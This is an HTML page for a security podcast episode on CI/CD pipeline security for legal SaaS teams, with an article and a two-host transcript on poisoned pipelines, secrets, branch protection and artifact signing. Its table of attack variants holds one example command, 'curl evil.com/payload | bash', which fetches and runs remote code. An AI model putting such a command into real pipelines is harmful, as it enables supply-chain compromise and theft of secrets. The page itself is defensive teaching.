@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Episode 46 &mdash; CI/CD Pipeline Security &mdash; Security for Legal SaaS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Lora:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config={theme:{extend:{colors:{ink:'#1a1a1a','ink-light':'#4a4a4a','ink-muted':'#7a7a7a',red:'#991B1B','red-soft':'#B91C1C',rule:'#e5e5e5','rule-dark':'#1a1a1a',paper:'#FAFAF8'},fontFamily:{serif:['Lora','Georgia','serif'],sans:['Inter','sans-serif']}}}}</script>
+    <link rel="stylesheet" href="../assets/css/plyr.css">
+</head>
+<body class="bg-paper font-serif text-ink text-base antialiased">
+    <header class="border-b-2 border-rule-dark">
+        <div class="max-w-3xl mx-auto px-6 py-8">
+            <a href="../index.html" class="block text-center text-3xl font-bold tracking-tight hover:text-red transition-colors">Security for Legal SaaS</a>
+            <nav class="flex justify-center gap-8 mt-4 text-sm font-sans text-ink-muted">
+                <a href="../index.html" class="hover:text-red transition">Episodes</a>
+                <a href="../outline.html" class="hover:text-red transition">Outline</a>
+                <a href="../about.html" class="hover:text-red transition">About</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="max-w-3xl mx-auto px-6 min-h-[60vh]">
+
+<!-- Episode meta -->
+<div class="py-12 border-b border-rule">
+    <p class="font-sans text-sm tracking-widest uppercase text-red mb-6">Episode 46 &middot; Module 10 &middot; Infrastructure</p>
+    <h1 class="text-4xl md:text-5xl font-bold leading-none mb-8">CI/CD Pipeline Security</h1>
+    <p class="text-ink-muted font-sans text-base">19 May 2026 &middot; 8:42 &middot; Security for Legal SaaS</p>
+</div>
+
+<!-- Audio player -->
+<div class="py-8 border-b border-rule">
+    <div class="flex items-center gap-6">
+        <button id="play-btn" class="w-14 h-14 border-2 border-ink rounded-full flex items-center justify-center hover:bg-ink hover:text-paper transition flex-shrink-0 group" onclick="document.getElementById('player').paused ? document.getElementById('player').play() : document.getElementById('player').pause()">
+            <svg id="icon-play" class="w-6 h-6 ml-0.5 text-ink group-hover:text-paper" fill="currentColor" viewBox="0 0 20 20"><polygon points="6,4 16,10 6,16"/></svg>
+            <svg id="icon-pause" class="w-6 h-6 text-ink group-hover:text-paper hidden" fill="currentColor" viewBox="0 0 20 20"><rect x="5" y="4" width="3.5" height="12"/><rect x="11.5" y="4" width="3.5" height="12"/></svg>
+        </button>
+        <div class="flex-1">
+            <audio id="player">
+                <source src="../audio/episode-46-cicd-pipeline-security.mp3" type="audio/mpeg">
+            </audio>
+            <div id="progress-bar" class="h-3 bg-rule relative cursor-pointer" style="margin-top:-6px;padding-top:6px;padding-bottom:6px;">
+                <div class="h-px bg-rule relative">
+                    <div id="progress-fill" class="absolute top-0 left-0 h-px w-0 bg-red"></div>
+                    <div id="progress-dot" class="absolute -top-1.5 left-0 w-3 h-3 rounded-full bg-red"></div>
+                </div>
+            </div>
+            <div class="flex justify-between text-sm font-sans text-ink-muted mt-3">
+                <span id="current-time">8:42</span>
+                <span>8:42</span>
+            </div>
+        </div>
+    </div>
+    <div class="mt-4 flex items-center gap-4">
+        <a href="../audio/episode-46-cicd-pipeline-security.mp3" download class="inline-flex items-center text-sm font-sans text-red hover:text-red-soft transition">
+            <svg class="w-5 h-5 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
+            </svg>
+            Download Episode
+        </a>
+    </div>
+</div>
+
+<!-- Description -->
+<div class="py-12 border-b border-rule">
+    <p class="text-lg leading-relaxed italic text-ink-light">CI/CD &mdash; Continuous Integration and Continuous Deployment (first introduced in [Episode 12](/lessons/ep12/)) &mdash; is the automated pipeline that takes your source code, builds it, tests it, and deploys it to production. Every time a developer pushes a code change, the pipeline runs: compile, test, package into a container (as we discussed in [Episode 45](/lessons/ep45/)), deploy. Here is the uncomfortable reality: your CI/CD pipeline has access to production credentials, container registries, cloud </p>
+</div>
+
+<!-- Article -->
+<article class="py-12 border-b border-rule">
+    <h2 class="font-sans text-sm tracking-widest uppercase text-ink-muted mb-10">Today&rsquo;s Lesson</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Security for Legal SaaS &mdash; Episode 46: CI/CD Pipeline Security</strong></p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">The Most Powerful System You Own</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">CI/CD &mdash; Continuous Integration and Continuous Deployment (first introduced in [Episode 12](/lessons/ep12/)) &mdash; is the automated pipeline that takes your source code, builds it, tests it, and deploys it to production. Every time a developer pushes a code change, the pipeline runs: compile, test, package into a container (as we discussed in [Episode 45](/lessons/ep45/)), deploy.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Here is the uncomfortable reality: your CI/CD pipeline has access to production credentials, container registries, cloud APIs, database connection strings, and signing keys. It runs arbitrary code &mdash; whatever is defined in the pipeline configuration file. It is, by a wide margin, the most powerful system in your organisation. And in most legal SaaS teams, it is also the least hardened.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[The OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/) [1] project catalogs the most critical attack vectors. The introduction states what security teams already know: CI/CD pipelines are &quot;the most privileged systems in most organisations&#39; infrastructure, holding credentials to deploy to production, push container images, query cloud APIs, and configure databases, yet they are frequently the least hardened, least monitored, and most credential-dense environments.&quot;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">The Pipeline as Attack Surface</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">An attacker who compromises your CI/CD pipeline doesn&#39;t need to find a vulnerability in your application. They can inject malicious code directly into your build process and have it deployed to production automatically. This is not theoretical.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[The Wiz security research team documented](https://www.wiz.io/blog/github-actions-security-guide) [2] how attackers have exploited GitHub Actions workflows to steal secrets, inject backdoors, and compromise downstream systems. In March 2025, attackers compromised the popular `tj-actions/changed-files` GitHub Action, affecting over 23,000 repositories. Every pipeline that used that Action executed attacker-controlled code with full access to the pipeline&#39;s secrets.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[GitGuardian&#39;s 2026 State of Secrets Sprawl report](https://blog.gitguardian.com/handle-secrets-in-ci-cd-pipelines/) [3] found nearly 29 million new secrets exposed on public GitHub in 2025 &mdash; a 34% year-over-year increase. CI/CD configuration files and build artifacts were among the primary exposure vectors.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;div style=&quot;background: #fff3f3; border-left: 4px solid #dc2626; padding: 16px; margin: 16px 0;&quot;&gt;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;strong&gt;Sobering statistic:&lt;/strong&gt; 59% of machines with compromised credentials in 2025 were CI/CD runners, not developer laptops. Pipelines &mdash; not people &mdash; are the primary breach surface.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;/div&gt;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Poisoned Pipeline Execution (PPE)</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[OWASP&#39;s CICD-SEC-4: Poisoned Pipeline Execution](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution) [4] describes three variants of pipeline poisoning:</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| Variant | How It Works | Example |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">|---------|-------------|---------|</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| <strong class="text-ink">Direct PPE (D-PPE)</strong> | Attacker modifies the pipeline config file (e.g., `.github/workflows/ci.yml`) in a branch or pull request | Changing the build step to `curl evil.com/payload \| bash` |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| <strong class="text-ink">Indirect PPE (I-PPE)</strong> | Attacker modifies files <em>referenced</em> by the pipeline config &mdash; build scripts, Makefiles, test configurations | Poisoning a test script that the pipeline executes |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| <strong class="text-ink">Public PPE (3PE)</strong> | Open-source repos allow external contributors to submit pull requests that trigger pipelines | A forked PR that modifies the build process |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">The impact is devastating: &quot;Once able to execute malicious code within the CI pipeline, the attacker can conduct a wide array of malicious operations, all within the context of the pipeline&#39;s identity.&quot; This includes access to every secret available to the job &mdash; cloud credentials, registry tokens, deployment keys, database passwords.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">For legal SaaS platforms, the consequence is direct: an attacker who poisons your pipeline can deploy a backdoored version of your contract review tool, your case management system, or your client portal &mdash; and your own deployment process delivers it to production.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Secret Management in Pipelines</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Secrets are the most sensitive assets in your pipeline. [The OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html) [5] provides clear guidance:</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Never hardcode secrets in pipeline configuration files.</strong> This seems obvious, but it remains one of the most common findings in security assessments. A database password in `.github/workflows/deploy.yml` is visible to every developer with repository access &mdash; and to every fork.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Use your CI platform&#39;s native secret management.</strong> GitHub Actions has encrypted secrets. GitLab CI has CI/CD variables with masking. Both inject secrets as environment variables at runtime and redact them from logs. But be aware of the limits &mdash; secrets injected as environment variables are visible to any process running in that pipeline step.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Integrate with an external secrets manager.</strong> For production credentials, use [HashiCorp Vault](https://www.hashicorp.com/products/vault) (introduced in [Episode 15](/lessons/ep15/)) or your cloud provider&#39;s secrets manager (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault). The pipeline authenticates to the secrets manager, retrieves only the credentials it needs for that specific deployment, and those credentials are short-lived &mdash; they expire after the deployment completes.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;div style=&quot;background: #f0f4ff; border-left: 4px solid #2563eb; padding: 16px; margin: 16px 0;&quot;&gt;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;strong&gt;Defence in depth for secrets:&lt;/strong&gt; Even with external secrets managers, limit what each pipeline job can access. A job that runs unit tests should not have access to production database credentials. A job that builds documentation should not have access to cloud deployment keys. Scope secrets to specific jobs, not the entire pipeline.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;/div&gt;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Branch Protection and Code Review</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Pipeline poisoning often starts with a malicious code change reaching a branch that triggers deployment. Branch protection rules are your first line of defence.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[GitHub&#39;s branch protection features](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-a-branch-rule/about-branch-rules) [6] and equivalent features in GitLab and Bitbucket allow you to:</p>
+    <ul class="list-disc list-inside space-y-2 my-4 text-base leading-relaxed text-ink-light">
+        <li><strong class="text-ink">Require pull request reviews</strong> before merging to protected branches (main, production)</li>
+        <li><strong class="text-ink">Require status checks</strong> &mdash; automated tests must pass before merge is allowed</li>
+        <li><strong class="text-ink">Require signed commits</strong> &mdash; commits must be cryptographically signed, proving the author&#39;s identity</li>
+        <li><strong class="text-ink">Restrict who can push</strong> &mdash; only designated team members can push directly to protected branches</li>
+        <li><strong class="text-ink">Dismiss stale reviews</strong> &mdash; new commits invalidate existing approvals, requiring re-review</li>
+    </ul>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">For a legal SaaS team, the minimum configuration on your production branch should be: at least one reviewer, passing CI checks, and no direct pushes. This ensures that no single developer &mdash; and no compromised developer account &mdash; can push malicious code straight to production.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Artifact Integrity &mdash; Signing Build Outputs</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Your pipeline produces artifacts &mdash; container images, compiled binaries, deployment packages. How do you know the artifact deployed to production is the same one your pipeline built? An attacker who compromises your container registry can replace a legitimate image with a backdoored one.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[Sigstore and Cosign](https://docs.sigstore.dev/cosign/signing/signing_with_containers/) [7] provide keyless signing for container images. The pipeline signs the image as part of the build process. At deployment, the orchestrator verifies the signature before running the image. If the image was tampered with, the signature check fails and deployment is blocked.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[SLSA (Supply-chain Levels for Software Artifacts)](https://slsa.dev/) [8] &mdash; which we&#39;ll explore in depth next episode &mdash; defines four levels of build integrity. At Level 2, the build process generates a signed provenance attestation &mdash; a cryptographic proof documenting what was built, from which source, by which build system. This connects directly to the provenance chains we discussed in Episode 43, but applied to the build process itself rather than AI outputs.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Least Privilege for Pipeline Service Accounts</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Pipeline service accounts &mdash; the identities your CI/CD system uses to interact with cloud providers, registries, and deployment targets &mdash; are consistently over-privileged. [The Akeyless research on CI/CD secret mismanagement](https://www.akeyless.io/blog/the-hidden-risks-of-secrets-management-in-ci-cd-pipelines/) [9] found that most pipeline service accounts have far broader permissions than necessary, often because they were set up once with admin-level access and never scoped down.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">The principle of least privilege (introduced in [Episode 8](/lessons/ep08/)) applies directly:</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| Pipeline Stage | Needed Permissions | Common Over-Privilege |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">|---------------|-------------------|----------------------|</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| Build | Read source code, write build artifacts | Full repo admin access |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| Test | Read test data, run containers locally | Access to production databases |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| Deploy | Push to specific container registry, update specific services | Full cloud admin |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">| Rollback | Update specific services to previous version | Delete infrastructure |</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Each stage should have its own service account with the minimum permissions required. A deploy account should be able to deploy &mdash; but never destroy infrastructure. A test account should be able to read test data &mdash; but never touch production.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">[Hardening CI/CD strategies from Visual Studio Magazine](https://visualstudiomagazine.com/articles/2025/10/06/hardening-ci-cd-essential-strategies-to-mitigate-security-risks.aspx) [10] recommends treating pipeline permissions as a security-critical configuration that requires review &mdash; not a one-time setup that gets forgotten.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;div style=&quot;background: #f0fdf4; border-left: 4px solid #16a34a; padding: 16px; margin: 16px 0;&quot;&gt;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;strong&gt;Key takeaway:&lt;/strong&gt; Your CI/CD pipeline is simultaneously your most powerful and most targeted system. Secure it with the same rigour you apply to production infrastructure: external secrets management, branch protection with mandatory reviews, signed artifacts, least-privilege service accounts, and continuous monitoring of pipeline execution. If your pipeline is compromised, your production is compromised &mdash; and your deployment process delivered the attack.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">&lt;/div&gt;</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">What&#39;s Next</h2>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Next episode, we zoom out from the pipeline to the broader software supply chain. When you didn&#39;t write 95% of your application&#39;s code, supply chain security &mdash; SBOMs, dependency scanning, build provenance, and lessons from SolarWinds and xz-utils &mdash; becomes a survival skill.</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">---</p>
+
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Sources &amp; Further Reading</strong></p>
+    <ol class="list-decimal list-inside space-y-2 my-4 text-base leading-relaxed text-ink-light">
+        <li>[OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)</li>
+        <li>[Hardening GitHub Actions: Lessons from Recent Attacks &mdash; Wiz](https://www.wiz.io/blog/github-actions-security-guide)</li>
+        <li>[CI/CD Secrets Management: Secure Your Pipelines &mdash; GitGuardian](https://blog.gitguardian.com/handle-secrets-in-ci-cd-pipelines/)</li>
+        <li>[CICD-SEC-4: Poisoned Pipeline Execution &mdash; OWASP](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution)</li>
+        <li>[CI/CD Security Cheat Sheet &mdash; OWASP](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)</li>
+        <li>[About Branch Rules &mdash; GitHub Documentation](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-a-branch-rule/about-branch-rules)</li>
+        <li>[Signing Containers with Cosign &mdash; Sigstore](https://docs.sigstore.dev/cosign/signing/signing_with_containers/)</li>
+        <li>[SLSA &mdash; Supply-chain Levels for Software Artifacts](https://slsa.dev/)</li>
+        <li>[Hidden Risks of Secrets Mismanagement in CI/CD &mdash; Akeyless](https://www.akeyless.io/blog/the-hidden-risks-of-secrets-management-in-ci-cd-pipelines/)</li>
+        <li>[Hardening CI/CD: Essential Strategies &mdash; Visual Studio Magazine](https://visualstudiomagazine.com/articles/2025/10/06/hardening-ci-cd-essential-strategies-to-mitigate-security-risks.aspx)</li>
+        <li>[Proactive Pipeline Security: OWASP Top 10 CI/CD Risks &mdash; Scribe Security](https://scribesecurity.com/blog/proactive-pipeline-security-applying-the-owasp-top-10-ci-cd-risks-with-scribe/)</li>
+    </ul>
+
+</article>
+
+<!-- Transcript -->
+<section class="py-10 border-b border-rule">
+    <button
+        class="font-sans text-base text-red hover:text-red-soft transition flex items-center gap-2 group"
+        onclick="document.getElementById('transcript-body').classList.toggle('hidden'); this.querySelector('svg').classList.toggle('rotate-90');"
+    >
+        <svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"/></svg>
+        <span class="border-b border-red/40 group-hover:border-red">Show Transcript</span>
+    </button>
+    <article id="transcript-body" class="hidden mt-8 space-y-4">
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">CI/CD Pipeline Security</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">Hosts: Alice (lead) and Dan (co-host)</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">Target duration: ~8 minutes (~1400 words)</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Welcome back to Security for Legal SaaS. I&#39;m Alice.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;And I&#39;m Dan. Episode 46 &mdash; CI/CD pipeline security. Alice, last episode we talked about hardening the containers themselves. Now we&#39;re talking about the system that builds and deploys those containers?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Right. CI/CD &mdash; Continuous Integration and Continuous Deployment &mdash; is the automated pipeline that takes your code, builds it, tests it, packages it into a container, and deploys it to production. Every time a developer pushes a change, this pipeline runs. And here&#39;s the thing most teams don&#39;t think about: this pipeline has access to everything. Production database credentials. Cloud provider keys. Container registry tokens. Deployment permissions. It runs arbitrary code &mdash; whatever&#39;s defined in the pipeline configuration file. It is the most powerful system in your organisation.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Mm. And I&#39;m guessing it&#39;s not treated that way?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Almost never. OWASP &mdash; the Open Web Application Security Project &mdash; published a dedicated Top 10 list just for CI/CD security risks. Their assessment is blunt: these pipelines are &quot;the most privileged systems in most organisations&#39; infrastructure&quot; and &quot;frequently the least hardened, least monitored, and most credential-dense environments.&quot; That&#39;s a dangerous combination.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Right. So what does an attack on a CI/CD pipeline actually look like?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Let me describe the most elegant version &mdash; it&#39;s called Poisoned Pipeline Execution. Imagine your legal SaaS platform uses GitHub Actions for CI/CD. Every pull request triggers the pipeline: run tests, build the container, deploy if the tests pass. An attacker submits a pull request. They don&#39;t even need to change your application code. They modify the pipeline configuration file &mdash; or a build script, or a test file that the pipeline executes &mdash; and inject a command that sends every secret in the pipeline to an external server. When the pipeline runs, it executes the attacker&#39;s code with full access to your secrets.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Hmm. That&#39;s not attacking the application at all. That&#39;s attacking the build process.&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Exactly. And it&#39;s devastatingly effective. In March 2025, attackers compromised a popular GitHub Action called &quot;changed-files&quot; that was used by over 23,000 repositories. Every pipeline that ran that Action executed attacker-controlled code. The secrets &mdash; cloud credentials, deployment keys, registry tokens &mdash; were exfiltrated silently. Your own deployment process delivers the attack.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Mm. That&#39;s sobering. So how do you defend against this?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Multiple layers. Let&#39;s start with secrets. Never &mdash; and I mean never &mdash; hardcode a secret in a pipeline configuration file. No database password in your workflow YAML. No API key in your build script. Use your CI platform&#39;s native secret management &mdash; GitHub has encrypted secrets, GitLab has masked variables. These inject secrets as environment variables at runtime and redact them from logs.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Yeah, but is that enough?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;&lt;sigh&gt; For production credentials, no. Platform secrets are a reasonable baseline, but they&#39;re available to any code that runs in that pipeline step. The better approach is to integrate with an external secrets manager &mdash; HashiCorp Vault, AWS Secrets Manager, or your cloud provider&#39;s equivalent. The pipeline authenticates to the vault, retrieves only the specific credentials it needs for that specific job, and those credentials are short-lived &mdash; they expire after the deployment completes. Even if an attacker exfiltrates them, they&#39;re useless within minutes.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Mm-hmm. What about the poisoned pipeline problem? How do you stop someone from injecting malicious code into the build?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Branch protection. Your main and production branches should require pull request reviews before merging. At least one reviewer, passing CI checks, no direct pushes. This means no single developer &mdash; and no compromised developer account &mdash; can push code straight to production without another human reviewing it. You should also require signed commits, which prove the author&#39;s identity cryptographically. And dismiss stale reviews &mdash; if a developer pushes new commits after the reviewer approved, the approval is invalidated and re-review is required.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Right. That stops a compromised account from slipping something in after the review.&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Exactly. And there&#39;s a subtlety here for pipeline security specifically. Even with branch protection on your main branch, the pipeline configuration itself might be modifiable through pull requests. Some CI systems will execute the pipeline config from the pull request branch, not from the protected main branch. That means the attacker&#39;s modified pipeline runs before any review happens. GitHub Actions handles this through workflow approval requirements for first-time contributors and through the `pull_request_target` event, which runs the workflow from the base branch. Check your CI platform&#39;s documentation for this specific scenario &mdash; it&#39;s one of the most common misconfiguration gaps.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Mm. Let me ask about the output side. The pipeline builds a container image. How do you know that image hasn&#39;t been tampered with between build and deployment?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;You sign it. Sigstore&#39;s Cosign tool provides keyless signing for container images. &quot;Keyless&quot; means you don&#39;t have to manage a long-lived private key &mdash; the pipeline authenticates with its existing identity, gets a short-lived signing certificate, signs the image, and the signature is recorded in a tamper-evident transparency log. At deployment, your orchestrator verifies the signature before running the image. If someone replaces the image in your registry with a backdoored version, the signature won&#39;t match and deployment is blocked.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Yeah, that&#39;s like a notarised document &mdash; you can verify it wasn&#39;t altered after signing.&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Good analogy. And this connects to what we&#39;ll cover next episode &mdash; supply chain security and build provenance. The idea is not just that the image was signed, but that you can prove what source code it was built from, which build system produced it, and that no one tampered with the process.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;One more thing &mdash; pipeline service accounts. The identities the pipeline uses to deploy. Are those typically well-scoped?&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Almost never. The pattern is depressingly common: someone sets up the pipeline, gives the service account admin access because it&#39;s easy, and moves on. That service account now has permission to destroy infrastructure, delete databases, modify IAM policies &mdash; none of which the pipeline needs. The principle of least privilege applies here as much as anywhere else. A build job needs read access to source code and write access to build artifacts. A deploy job needs permission to push to a specific container registry and update specific services. A rollback job needs to update services to a previous version. None of them need admin access. Scope them tightly.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Mm. And for a legal SaaS team building a case management platform or a document review tool, this pipeline security is directly protecting client data.&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Directly. If your pipeline is compromised, the attacker can deploy whatever they want to your production environment. A backdoored version of your contract review tool that exfiltrates client documents. A modified authentication service that gives the attacker admin access. Your clients &mdash; law firms handling privileged communications &mdash; would never know until the breach is discovered. Pipeline security is client data security.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;Strong point. Next episode &mdash; supply chain security. SBOMs, dependency scanning, build provenance, and what SolarWinds and xz-utils taught us about trusting the code we didn&#39;t write.&lt;/Person2&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Until then, I&#39;m Alice.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person2&gt;And I&#39;m Dan.&lt;/Person2&gt;</p>
+
